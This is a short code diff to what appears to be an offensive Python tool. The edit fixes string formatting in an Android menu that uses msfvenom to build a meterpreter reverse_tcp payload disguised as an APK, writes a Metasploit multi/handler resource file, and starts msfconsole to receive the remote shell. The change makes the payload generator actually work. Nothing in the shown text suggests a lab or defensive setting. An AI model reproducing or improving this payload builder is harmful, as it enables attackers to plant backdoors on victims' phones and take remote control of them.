@@ -58,9 +58,9 @@ def AndroidMenu():
 			print(f" {CC}Your Local PORT is {AM1P}{DF}")
 		else:
 			print(f"  {RC}Enter A Valid Option.......!")
-		os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST={AM1H} LPORT={AM1GP} R > /storage/emulated/0/{AM1N}.apk')
+		os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={AM1H} LPORT={AM1GP} R > /storage/emulated/0/{AM1N}.apk')
 		PayloadApk = open("payloadapk.rc", "w")
-		PayloadApk.write("use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost {AM1H}\nset lport {AM1P}\nexploit")
+		PayloadApk.write(f"use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost {AM1H}\nset lport {AM1P}\nexploit")
 		PayloadApk.close()
 		os.system("msfconsole -r payloadapk.rc")
 	if AM == '9':
